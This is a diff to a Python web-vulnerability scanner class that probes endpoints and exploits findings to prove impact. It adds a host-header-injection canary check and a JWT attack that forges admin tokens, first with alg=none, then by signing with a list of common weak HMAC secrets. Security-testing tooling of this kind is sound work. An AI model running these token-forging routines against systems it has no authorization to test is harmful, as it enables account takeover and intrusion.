@@ -6,9 +6,11 @@ that, given a web base URL, will
   1. DISCOVER endpoints (crawl the entry point + probe a curated wordlist and
      common API-nesting patterns), then
   2. DETECT the canonical web vulnerability classes (SQLi, reflected/stored
-     XSS, IDOR/BOLA, mass assignment, SSTI, JWT alg=none, prototype pollution,
+     XSS, IDOR/BOLA, mass assignment, SSTI, JWT alg=none + weak/hardcoded
+     JWT secret, prototype pollution,
      race condition/TOCTOU, path traversal, command injection/RCE, XXE,
-     SSRF, open redirect, CORS misconfiguration, CRLF injection), and
+     SSRF, open redirect, CORS misconfiguration, CRLF injection, host
+     header injection), and
   3. EXPLOIT the critical ones to *prove impact* — extracting whatever
      sensitive data / flag is reachable, and embedding that proof into the
      finding's evidence.
@@ -1365,6 +1367,155 @@ class WebAppHunter:
                 break  # one finding per endpoint is enough
         return findings
 
+    # ---- Host header injection (canary Host reflection) -------------------
+    def _detect_host_header(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
+        """Host header injection: the server reflects an attacker-controlled
+        ``Host`` header into the response body (reflected URLs, password
+        reset links, absolute-URL generation) or into a ``Location`` header.
+
+        A unique canary host is sent in the ``Host`` header; the flag fires
+        only when that exact canary appears in the response body or a
+        redirect Location. A correct server ignores the Host header for
+        URL generation (or uses the canonical host), so the canary is never
+        echoed — near-zero false positives. No extra requests beyond a GET
+        per endpoint; the canary proves reflection deterministically.
+        """
+        findings: List[Dict[str, Any]] = []
+        canary = f"hostinj{uuid.uuid4().hex[:10]}.example"
+        for path in list(endpoints):
+            try:
+                r = self._get(path, headers={"Host": canary})
+            except Exception:
+                continue
+            body = r.text or ""
+            # Canary echoed into the body (URL built from the Host header).
+            if canary in body:
+                # Show the reflected context for the report.
+                idx = body.find(canary)
+                ctx_snip = body[max(0, idx - 60): idx + len(canary) + 60]
+                findings.append(
+                    self._finding(
+                        "host_header_injection", path,
+                        f"Host Header Injection on {path}",
+                        "The server builds URLs from the attacker-controlled "
+                        "Host header, allowing link phishing (password-reset / "
+                        "absolute-URL poisoning) and cache poisoning on "
+                        "downstream proxies that key on Host.",
+                        f"GET {self._abs(path)} with Host: {canary!r} reflected the "
+                        f"canary host into the response body: ...{ctx_snip}...",
+                        "medium", 0.9,
+                        param="Host", payload=canary, method="GET", url=r.url,
+                    )
+                )
+                continue
+            # Canary echoed into a redirect Location.
+            loc = (r.headers or {}).get("Location", "") or ""
+            if canary in loc:
+                findings.append(
+                    self._finding(
+                        "host_header_injection", path,
+                        f"Host Header Injection (redirect) on {path}",
+                        "The server builds a redirect Location from the "
+                        "attacker-controlled Host header, enabling open "
+                        "redirect + cache poisoning.",
+                        f"GET {self._abs(path)} with Host: {canary!r} returned "
+                        f"Location: {loc[:200]}",
+                        "medium", 0.9,
+                        param="Host", payload=canary, method="GET", url=r.url,
+                    )
+                )
+        return findings
+
+    # ---- Weak / hardcoded JWT secret (small dictionary, FORGED-ADMIN proof)
+    def _detect_jwt_weak_secret(self, endpoints: Dict[str, EndpointInfo]) -> List[Dict[str, Any]]:
+        """Weak or hardcoded JWT HMAC secret.
+
+        The ``jwt_none`` detector already covers the ``alg=none`` bypass; this
+        one covers the other dominant misconfiguration — a predictable/weak
+        HS256 signing secret. It only runs on JWT endpoints that did NOT
+        accept ``alg=none`` (the weak-secret class is what remains when
+        ``none`` is rejected), and only fires when a secret from a small,
+        well-known weak-secret list actually forges a VALID admin token that
+        the server accepts. Because the proof is a forged-admin token being
+        accepted as valid (not just "secret is short"), the false-positive
+        rate is near zero: a random strong secret cannot be in the list.
+
+        The dictionary is deliberately tiny and bounded (common defaults a
+        real app would ship by accident) so the cost is at most a few dozen
+        signature attempts on a single endpoint.
+        """
+        import base64
+        import hashlib
+        import hmac as _hmac
+
+        findings: List[Dict[str, Any]] = []
+        verify_ep = self._role(endpoints, "jwt/verify", "verify", "jwt", "token")
+        if not verify_ep:
+            return findings
+
+        def _b64u(d: Dict[str, Any]) -> str:
+            return base64.urlsafe_b64encode(
+                json.dumps(d, separators=(",", ":")).encode()
+            ).rstrip(b"=").decode()
+
+        # Only probe a JWT endpoint that is NOT already vulnerable to
+        # alg=none: if alg=none works, that is the higher-priority finding
+        # and the weak-secret class is moot.
+        none_tok = (
+            f"{_b64u({'alg': 'none', 'typ': 'JWT'})}."
+            f"{_b64u({'user': 'admin', 'role': 'admin', 'id': 999})}."
+        )
+        rn = self._post(verify_ep, json_body={"token": none_tok})
+        rj = rn.json()
+        if isinstance(rj, dict) and rj.get("valid") is True:
+            return findings  # alg=none already reported by _detect_jwt_none
+
+        # A bounded, high-signal weak-secret list (accidental production
+        # defaults). Forging a valid admin token with any of these is a
+        # deterministic, zero-FP proof of a weak/hardcoded secret.
+        weak_secrets = [
+            "secret", "password", "123456", "1234567890", "jwtsecret",
+            "supersecret", "supersecretkey-12345", "changeit", "changeme",
+            "admin", "test", "dev", "development", "prod", "key", "mysecret",
+            "abcdef", "qwerty", "letmein", "hunter2", "iloveyou",
+            "notsosecret", "secret123", "jwt-secret", "signing-key",
+        ]
+
+        def _sign(secret: str) -> str:
+            h = _b64u({"alg": "HS256", "typ": "JWT"})
+            # iat = now (a far-future iat is rejected by strict JWT libs);
+            # the forged claim set is what matters, not the timestamp.
+            p = _b64u({"user": "admin", "role": "admin", "id": 999, "iat": int(time.time())})
+            sig = _hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
+            return f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
+
+        for secret in weak_secrets:
+            try:
+                tok = _sign(secret)
+            except Exception:
+                continue
+            r = self._post(verify_ep, json_body={"token": tok})
+            d = r.json()
+            if isinstance(d, dict) and d.get("valid") is True:
+                findings.append(
+                    self._finding(
+                        "jwt_weak_secret", verify_ep,
+                        "JWT Weak / Hardcoded HMAC Secret",
+                        "The JWT HS256 signing secret is a well-known weak "
+                        "value, so an attacker can forge valid tokens for any "
+                        "user — including admin (proven below).",
+                        f"POST {self._abs(verify_ep)} with a forged admin token "
+                        f"signed with weak secret {secret!r} was accepted as "
+                        f"valid. Forged token: {tok[:90]}...\nResponse: "
+                        f"{r.text[:300]}",
+                        "critical", 0.95,
+                        param="token", payload=tok[:120], method="POST", url=r.url,
+                        extra={"weak_secret": secret},
+                    )
+                )
+                break  # one proven weak secret is enough
+        return findings
+
     # ====================================================================== #
     # 3. ORCHESTRATION
     # ====================================================================== #
@@ -1381,9 +1532,9 @@ class WebAppHunter:
             # and sqli before race (sqli leaks coupon codes used by the race detector).
             ordered = [
                 "mass_assignment", "sqli", "xss", "xss_stored", "idor",
-                "ssti", "jwt_none", "prototype_pollution", "race_condition",
-                "path_traversal", "rce", "xxe", "ssrf", "open_redirect",
-                "cors", "crlf",
+                "ssti", "jwt_none", "jwt_weak_secret", "prototype_pollution",
+                "race_condition", "path_traversal", "rce", "xxe", "ssrf",
+                "open_redirect", "cors", "crlf", "host_header",
             ]
             runner: Dict[str, Any] = {
                 "mass_assignment": self._detect_mass_assignment,
@@ -1393,6 +1544,7 @@ class WebAppHunter:
                 "idor": self._detect_idor,
                 "ssti": self._detect_ssti,
                 "jwt_none": self._detect_jwt_none,
+                "jwt_weak_secret": self._detect_jwt_weak_secret,
                 "prototype_pollution": self._detect_proto_pollution,
                 "race_condition": self._detect_race,
                 "path_traversal": self._detect_path_traversal,
@@ -1402,6 +1554,7 @@ class WebAppHunter:
                 "open_redirect": self._detect_open_redirect,
                 "cors": self._detect_cors,
                 "crlf": self._detect_crlf,
+                "host_header": self._detect_host_header,
             }
             for name in ordered:
                 if classes and name not in classes:
